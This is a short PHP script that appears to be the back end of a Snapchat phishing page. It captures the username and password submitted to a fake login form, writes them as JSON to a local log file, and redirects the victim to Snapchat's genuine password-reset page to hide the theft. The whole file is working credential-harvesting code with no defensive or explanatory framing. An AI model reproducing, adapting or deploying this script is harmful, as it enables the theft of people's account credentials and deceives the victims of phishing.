<?php


header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
$data = array('site' => 'Snapchat',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>